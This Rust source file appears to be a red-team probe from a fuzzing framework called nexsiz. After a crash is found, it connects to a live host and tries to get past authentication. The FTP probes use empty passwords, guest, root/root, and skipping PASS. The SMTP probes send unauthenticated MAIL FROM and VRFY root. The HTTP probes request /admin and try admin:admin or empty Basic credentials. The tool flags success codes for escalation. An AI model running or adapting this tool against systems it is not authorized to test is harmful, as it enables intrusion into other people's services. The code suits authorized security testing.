//! nxs-auth-bypass — official nexsiz existence script 
//!
//! Contract id: crash/auth-bypass
//! Purpose    : Protocol-aware authentication sequence injection after a
//!              crash discovery. Uses --model (or meta.model) to select
//!              FTP / SMTP / HTTP heuristics. Escalate when the target
//!              appears to accept an unauthorized transition.
//!
//! Exit 2     : Unauthorized-looking success observed → escalate.
//! Exit 0     : No bypass signal.
//! Exit 1     : Operational error.
//! Exit 3     : Internal timeout budget exhausted.
//!
//! Design (red-team grade):
//! - Bounded probe set and wall budget.
//! - Pure TCP.
//! - Heuristics are conservative; false-positives preferred over misses
//!   only when response codes clearly indicate success without prior auth.
//! - Intrusive category.

use nxs_lib::{
    args::Args,
    exit::ExitCode,
    meta::{self, Meta},
    report::Report,
};
use std::fs;
use std::io::{Read, Write};
use std::net::TcpStream;
use std::time::{Duration, Instant};

const NXS_ID: &str = "crash/auth-bypass";
const NXS_VERSION: &str = "1.0.0";
const DEFAULT_TIMEOUT_SECS: u64 = 16;
const MAX_PROBES: usize = 8;

fn main() {
    let args = Args::parse();

    if args.help {
        print_help();
        ExitCode::Ok.exit();
    }
    if args.version {
        println!("{} {} (id={})", env!("CARGO_PKG_NAME"), NXS_VERSION, NXS_ID);
        ExitCode::Ok.exit();
    }

    if let Err(e) = args.validate_required() {
        eprintln!("error: {}", e);
        ExitCode::Error.exit();
    }

    let meta = meta::load_or_exit(&args.meta);
    run(&args, &meta);
}

fn run(args: &Args, meta: &Meta) {
    let timeout_secs = args.timeout.unwrap_or(DEFAULT_TIMEOUT_SECS);
    let timeout = Duration::from_secs(timeout_secs);
    let budget = Instant::now();

    let input_path = match meta.effective_input_path(&args.crash, &args.minimized) {
        Some(p) => p,
        None => {
            eprintln!("error: no crash / minimised path resolved");
            ExitCode::Error.exit();
        }
    };
    let target = match meta.effective_target(&args.target) {
        Some(t) => t,
        None => {
            eprintln!("error: no target resolved");
            ExitCode::Error.exit();
        }
    };
    let event = meta.effective_event(&args.event);
    let crash_id = meta.crash_id().map(str::to_string);
    let model = meta
        .effective_model(&args.model)
        .unwrap_or_else(|| "generic".into())
        .to_lowercase();

    args.log(&format!(
        "id={} event={} target={} input={} model={}",
        NXS_ID,
        event,
        target,
        input_path.display(),
        model
    ));

    let payload = match fs::read(&input_path) {
        Ok(b) => b,
        Err(e) => {
            eprintln!("error: read {}: {}", input_path.display(), e);
            ExitCode::Error.exit();
        }
    };

    let probes = build_auth_probes(&model, &payload);
    let mut findings: Vec<String> = Vec::new();
    let mut bypass = false;

    for (name, data) in probes.iter().take(MAX_PROBES) {
        if budget.elapsed() > timeout {
            findings.push("probe budget exhausted".into());
            break;
        }
        let outcome = probe(&target, data, timeout, args.verbose);
        args.log(&format!(
            "probe={} class={:?} codes={:?} detail={}",
            name, outcome.class, outcome.codes, outcome.detail
        ));

        if is_bypass_signal(&model, name, &outcome) {
            bypass = true;
            findings.push(format!(
                "bypass signal on '{}': class={:?} codes={:?} ({})",
                name, outcome.class, outcome.codes, outcome.detail
            ));
        }
    }

    let (exit, summary): (ExitCode, String) = if bypass {
        (
            ExitCode::Escalate,
            format!("Auth-bypass signal(s) on model '{}'", model),
        )
    } else if budget.elapsed() > timeout {
        (ExitCode::Timeout, "Budget exhausted".into())
    } else {
        (
            ExitCode::Ok,
            format!("No auth-bypass signal (model='{}')", model),
        )
    };

    finish(args, &target, crash_id, exit, &summary, &findings);
}

fn finish(
    args: &Args,
    target: &str,
    crash_id: Option<String>,
    exit: ExitCode,
    summary: &str,
    findings: &[String],
) -> ! {
    let mut report = Report::new(NXS_ID, NXS_VERSION)
        .with_target(target)
        .with_crash_id(crash_id)
        .with_exit_hint(exit)
        .with_summary(summary);
    for f in findings {
        report.add_finding(f.clone());
    }

    if let Some(out) = &args.out {
        match report.write(out) {
            Ok(p) => args.log(&format!("report written {}", p.display())),
            Err(e) => eprintln!("warn: {}", e),
        }
    }
    if let Ok(line) = serde_json::to_string(&report) {
        println!("{}", line);
    }
    exit.exit();
}

// ---------------------------------------------------------------------------
// Auth probe construction (protocol heuristics)
// ---------------------------------------------------------------------------

fn build_auth_probes(model: &str, original: &[u8]) -> Vec<(String, Vec<u8>)> {
    let mut v = Vec::new();

    // Always include original as reference.
    v.push(("original".into(), original.to_vec()));

    match model {
        "ftp" | "grammar-ftp" | "g-ftp" => {
            // Empty password
            v.push((
                "ftp_empty_pass".into(),
                b"USER anonymous\r\nPASS \r\nPWD\r\nQUIT\r\n".to_vec(),
            ));
            // Known weak
            v.push((
                "ftp_guest".into(),
                b"USER ftp\r\nPASS ftp\r\nPWD\r\nQUIT\r\n".to_vec(),
            ));
            // Skip PASS entirely
            v.push((
                "ftp_skip_pass".into(),
                b"USER anonymous\r\nPWD\r\nLIST\r\nQUIT\r\n".to_vec(),
            ));
            // Root attempt
            v.push((
                "ftp_root".into(),
                b"USER root\r\nPASS root\r\nPWD\r\nQUIT\r\n".to_vec(),
            ));
            // Inject after original (if original looks like partial login)
            if !original.is_empty() {
                let mut p = original.to_vec();
                if !p.ends_with(b"\n") {
                    p.extend_from_slice(b"\r\n");
                }
                p.extend_from_slice(b"PWD\r\nLIST\r\n");
                v.push(("ftp_orig_then_pwd".into(), p));
            }
        }
        "smtp" | "grammar-smtp" | "g-smtp" => {
            v.push((
                "smtp_mail_no_auth".into(),
                b"EHLO localhost\r\nMAIL FROM:<attacker@evil>\r\nRCPT TO:<victim@local>\r\nQUIT\r\n"
                    .to_vec(),
            ));
            v.push((
                "smtp_vrfy_root".into(),
                b"EHLO localhost\r\nVRFY root\r\nQUIT\r\n".to_vec(),
            ));
            v.push((
                "smtp_empty_from".into(),
                b"EHLO localhost\r\nMAIL FROM:<>\r\nRCPT TO:<postmaster>\r\nQUIT\r\n".to_vec(),
            ));
            if !original.is_empty() {
                let mut p = original.to_vec();
                if !p.ends_with(b"\n") {
                    p.extend_from_slice(b"\r\n");
                }
                p.extend_from_slice(b"MAIL FROM:<x@y>\r\nRCPT TO:<z@z>\r\n");
                v.push(("smtp_orig_then_mail".into(), p));
            }
        }
        "http" | "grammar-http" | "g-http" => {
            v.push((
                "http_no_auth".into(),
                b"GET /admin HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n".to_vec(),
            ));
            v.push((
                "http_basic_empty".into(),
                b"GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic Og==\r\nConnection: close\r\n\r\n"
                    .to_vec(),
            ));
            v.push((
                "http_basic_admin".into(),
                b"GET / HTTP/1.1\r\nHost: localhost\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\nConnection: close\r\n\r\n"
                    .to_vec(),
            ));
            // Strip Authorization header from original if present
            if let Some(stripped) = strip_http_header(original, b"Authorization") {
                v.push(("http_strip_auth".into(), stripped));
            }
            if !original.is_empty() {
                v.push(("http_original".into(), original.to_vec()));
            }
        }
        _ => {
            // Generic: inject common auth-ish tokens around original
            if !original.is_empty() {
                let mut p = b"USER admin\r\nPASS admin\r\n".to_vec();
                p.extend_from_slice(original);
                v.push(("generic_user_pass_prefix".into(), p));

                let mut p2 = original.to_vec();
                p2.extend_from_slice(b"\r\nAuthorization: Basic YWRtaW46YWRtaW4=\r\n");
                v.push(("generic_auth_suffix".into(), p2));
            }
            v.push((
                "generic_anon".into(),
                b"USER anonymous\r\nPASS guest\r\n".to_vec(),
            ));
        }
    }

    v
}

fn strip_http_header(data: &[u8], header: &[u8]) -> Option<Vec<u8>> {
    let text = String::from_utf8_lossy(data);
    let header_l = String::from_utf8_lossy(header).to_lowercase();
    let mut out = String::new();
    let mut changed = false;
    for line in text.split_inclusive('\n') {
        let lower = line.to_lowercase();
        if lower.starts_with(&header_l) && lower.contains(':') {
            changed = true;
            continue;
        }
        out.push_str(line);
    }
    if changed {
        Some(out.into_bytes())
    } else {
        None
    }
}

fn is_bypass_signal(model: &str, probe_name: &str, outcome: &ProbeOutcome) -> bool {
    if outcome.class != Class::Responded {
        return false;
    }
    let codes = &outcome.codes;

    match model {
        "ftp" | "grammar-ftp" | "g-ftp" => {
            // 230 = User logged in; 250 = Requested file action okay
            // After empty/skip/guest probes these are strong signals.
            if probe_name.contains("empty")
                || probe_name.contains("skip")
                || probe_name.contains("guest")
                || probe_name.contains("root")
            {
                return codes.iter().any(|c| *c == 230 || *c == 250);
            }
            false
        }
        "smtp" | "grammar-smtp" | "g-smtp" => {
            // 250 after MAIL/RCPT without AUTH is interesting on hardened servers
            if probe_name.contains("mail") || probe_name.contains("vrfy") {
                return codes.iter().any(|c| *c == 250 || *c == 252);
            }
            false
        }
        "http" | "grammar-http" | "g-http" => {
            // 200/204/301/302 on admin or stripped-auth paths
            if probe_name.contains("no_auth")
                || probe_name.contains("strip")
                || probe_name.contains("basic")
            {
                return codes
                    .iter()
                    .any(|c| matches!(*c, 200 | 204 | 301 | 302 | 307));
            }
            false
        }
        _ => {
            // Generic: any 2xx-like FTP/SMTP code after injected auth
            codes.iter().any(|c| matches!(*c, 230 | 250 | 200))
        }
    }
}

// ---------------------------------------------------------------------------
// Probe engine
// ---------------------------------------------------------------------------

#[derive(Debug, Clone, PartialEq, Eq)]
enum Class {
    Crash,
    Hang,
    Responded,
    Unreachable,
}

struct ProbeOutcome {
    class: Class,
    codes: Vec<u16>,
    detail: String,
}

fn probe(target: &str, payload: &[u8], timeout: Duration, verbose: bool) -> ProbeOutcome {
    let addr = match resolve_addr(target) {
        Ok(a) => a,
        Err(e) => {
            return ProbeOutcome {
                class: Class::Unreachable,
                codes: vec![],
                detail: e,
            };
        }
    };

    let stream = match TcpStream::connect_timeout(&addr, timeout) {
        Ok(s) => s,
        Err(e) => {
            let d = e.to_string();
            let class = if is_crash_like(&d) {
                Class::Crash
            } else {
                Class::Unreachable
            };
            return ProbeOutcome {
                class,
                codes: vec![],
                detail: d,
            };
        }
    };

    let _ = stream.set_read_timeout(Some(timeout));
    let _ = stream.set_write_timeout(Some(timeout));
    let mut stream = stream;

    // Some servers send a banner first — drain briefly before write.
    {
        let mut banner = [0u8; 1024];
        let _ = stream.set_read_timeout(Some(Duration::from_millis(200)));
        let _ = stream.read(&mut banner);
        let _ = stream.set_read_timeout(Some(timeout));
    }

    if let Err(e) = stream.write_all(payload) {
        let d = e.to_string();
        let class = if is_crash_like(&d) {
            Class::Crash
        } else {
            Class::Unreachable
        };
        return ProbeOutcome {
            class,
            codes: vec![],
            detail: d,
        };
    }
    let _ = stream.flush();

    let mut total = Vec::new();
    let mut buf = [0u8; 4096];
    loop {
        match stream.read(&mut buf) {
            Ok(0) => break,
            Ok(n) => {
                total.extend_from_slice(&buf[..n]);
                if total.len() >= 8192 {
                    break;
                }
            }
            Err(e) => {
                let d = e.to_string();
                if is_timeout(&d) {
                    if total.is_empty() {
                        return ProbeOutcome {
                            class: Class::Hang,
                            codes: vec![],
                            detail: format!("timeout ({:?})", timeout),
                        };
                    }
                    break;
                }
                if is_crash_like(&d) && total.is_empty() {
                    return ProbeOutcome {
                        class: Class::Crash,
                        codes: vec![],
                        detail: d,
                    };
                }
                break;
            }
        }
    }

    if total.is_empty() {
        return ProbeOutcome {
            class: Class::Crash,
            codes: vec![],
            detail: "EOF after payload".into(),
        };
    }

    if verbose {
        eprintln!("[nxs] recv {} bytes", total.len());
    }

    let codes = extract_status_codes(&total);
    ProbeOutcome {
        class: Class::Responded,
        codes,
        detail: format!("recv {}", total.len()),
    }
}

fn extract_status_codes(body: &[u8]) -> Vec<u16> {
    let text = String::from_utf8_lossy(body);
    let mut codes = Vec::new();
    for line in text.lines() {
        let trimmed = line.trim_start();
        if trimmed.len() >= 3 {
            let digits = &trimmed.as_bytes()[..3];
            if digits.iter().all(|b| b.is_ascii_digit()) {
                if let Ok(c) = std::str::from_utf8(digits).unwrap_or("").parse::<u16>() {
                    if (100..600).contains(&c) && !codes.contains(&c) {
                        codes.push(c);
                    }
                }
            }
        }
        if let Some(pos) = trimmed.find("HTTP/") {
            let rest = &trimmed[pos..];
            if let Some(sp) = rest.find(' ') {
                let maybe = rest[sp + 1..].trim_start();
                if maybe.len() >= 3 {
                    if let Ok(c) = maybe[..3].parse::<u16>() {
                        if (100..600).contains(&c) && !codes.contains(&c) {
                            codes.push(c);
                        }
                    }
                }
            }
        }
    }
    codes
}

fn resolve_addr(target: &str) -> Result<std::net::SocketAddr, String> {
    use std::net::ToSocketAddrs;
    target
        .to_socket_addrs()
        .map_err(|e| e.to_string())?
        .next()
        .ok_or_else(|| format!("cannot resolve {}", target))
}

fn is_crash_like(msg: &str) -> bool {
    let m = msg.to_lowercase();
    m.contains("connection reset")
        || m.contains("broken pipe")
        || m.contains("connection refused")
        || m.contains("forcibly closed")
        || m.contains("connection aborted")
}

fn is_timeout(msg: &str) -> bool {
    let m = msg.to_lowercase();
    m.contains("timed out") || m.contains("timeout") || m.contains("would block")
}

fn print_help() {
    eprintln!(
        r#"nxs-auth-bypass {ver} (id={id})

Protocol-aware authentication sequence bypass / injection probe.
Uses --model / meta.model for FTP, SMTP, HTTP heuristics.

USAGE:
    nxs-auth-bypass --crash <path> --target <host:port> [OPTIONS]
    nxs-auth-bypass --meta <path> [OPTIONS]

GLOBAL OPTIONS (contract):
    --crash <path>         Input that caused the event
    --target <host:port>   Live target
    --event <type>         crash | …
    --model <name>         Protocol model (ftp|smtp|http|generic)
    --minimized <path>     Prefer as baseline
    --meta <path>          Nexsiz metadata JSON
    --out <dir>            report.json
    --timeout <secs>       Total wall budget (default: {def})
    -v, --verbose
    -h, --help
    --version

EXIT CODES:
    0  No auth-bypass signal
    1  Operational error
    2  Bypass signal observed → escalate
    3  Internal timeout budget exhausted

NOTE: Intrusive — contacts the live target multiple times with auth variants.
"#,
        ver = NXS_VERSION,
        id = NXS_ID,
        def = DEFAULT_TIMEOUT_SECS,
    );
}
